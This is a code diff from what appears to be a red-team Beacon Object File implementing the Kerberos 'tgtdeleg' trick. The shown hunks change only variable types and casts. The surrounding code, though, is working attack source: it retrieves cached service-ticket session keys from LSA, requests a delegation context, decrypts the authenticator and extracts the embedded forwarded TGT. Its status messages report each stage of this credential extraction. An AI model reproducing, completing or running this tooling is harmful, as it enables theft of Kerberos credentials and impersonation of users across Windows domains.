@@ -46,7 +46,7 @@ bool GetEncryptionKeyFromCache(char* target, int encType, byte** key, int* keySi
     if (!SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage)) {
 
         int targetLength = my_strlen(target) * 2 + 2;
-        int requestSize = targetLength + sizeof(KERB_RETRIEVE_TKT_REQUEST);
+        ULONG requestSize = targetLength + sizeof(KERB_RETRIEVE_TKT_REQUEST);
         PKERB_RETRIEVE_TKT_REQUEST request = MemAlloc(requestSize * sizeof(KERB_RETRIEVE_TKT_REQUEST));
 
         request->MessageType = KerbRetrieveEncodedTicketMessage;
@@ -54,12 +54,12 @@ bool GetEncryptionKeyFromCache(char* target, int encType, byte** key, int* keySi
         request->EncryptionType = encType;
         request->TargetName.Length = targetLength - 2;
         request->TargetName.MaximumLength = targetLength;
-        request->TargetName.Buffer = ((byte*)request) + sizeof(KERB_RETRIEVE_TKT_REQUEST);
+        request->TargetName.Buffer = (PWSTR)(((byte*)request) + sizeof(KERB_RETRIEVE_TKT_REQUEST));
         KERNEL32$MultiByteToWideChar(CP_ACP, 0, target, targetLength / 2, request->TargetName.Buffer, targetLength);
 
         PKERB_RETRIEVE_TKT_RESPONSE response = NULL;
         NTSTATUS protocolStatus = 0;
-        status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, request, requestSize, &response, &requestSize, &protocolStatus);
+        status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, request, requestSize, (PVOID *)&response, &requestSize, &protocolStatus);
         if (!status && !protocolStatus && requestSize > 0) {
             *key = MemAlloc(response->Ticket.SessionKey.Length);
             MemCpy(*key, response->Ticket.SessionKey.Value, response->Ticket.SessionKey.Length);
@@ -101,7 +101,7 @@ void TgtDeleg(char* targetSPN) {
         CtxtHandle    ClientContext = { 0 };
         SecBuffer     ClientTokenArray = { 0, SECBUFFER_TOKEN, NULL };
         SecBufferDesc ClientToken = { SECBUFFER_VERSION, 1, &ClientTokenArray };
-        UINT ClientContextAttributes = 0;
+        ULONG ClientContextAttributes = 0;
         status = SECUR32$InitializeSecurityContextA(&phCredential, NULL, targetSPN, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH, 0, SECURITY_NATIVE_DREP, NULL, 0, &ClientContext, &ClientToken, &ClientContextAttributes, NULL);
 
         if ((status == SEC_E_OK) || (status == SEC_I_CONTINUE_NEEDED)) {
@@ -142,7 +142,7 @@ void TgtDeleg(char* targetSPN) {
                                     PRINT_OUT("[*] Extracted the service ticket session key from the ticket cache: %s\n", base64SessionKey);
 
                                     byte* rawBytes = NULL;
-                                    size_t rawBytesSize = 0;
+                                    int rawBytesSize = 0;
                                     if (decrypt(key, authenticatorEtype, KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, encAuthenticator.cipher, encAuthenticator.cipher_size, &rawBytes, &rawBytesSize))return;
 
                                     AsnElt asnAuthenticator = { 0 };
@@ -154,7 +154,7 @@ void TgtDeleg(char* targetSPN) {
                                         if (elt2.tagValue == 3) {
                                             PRINT_OUT("[+] Successfully decrypted the authenticator\n");
 
-                                            int cksumtype = 0;
+                                            long cksumtype = 0;
                                             if (AsnGetInteger(&(elt2.sub[0].sub[0].sub[0]), &cksumtype)) return;
 
                                             if (cksumtype == 0x8003) {
@@ -191,7 +191,7 @@ void TgtDeleg(char* targetSPN) {
                                                             if (AsnGetOctetString(&(elt3.sub[0].sub[1]), &enc_part, &enc_part_size)) return;
 
                                                             byte* rawBytes2 = NULL;
-                                                            size_t rawBytes2Size = 0;
+                                                            int rawBytes2Size = 0;
                                                             if (decrypt(key, authenticatorEtype, KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART, enc_part, enc_part_size, &rawBytes2, &rawBytes2Size))return;
 
                                                             AsnElt encKrbCredPartAsn = { 0 };
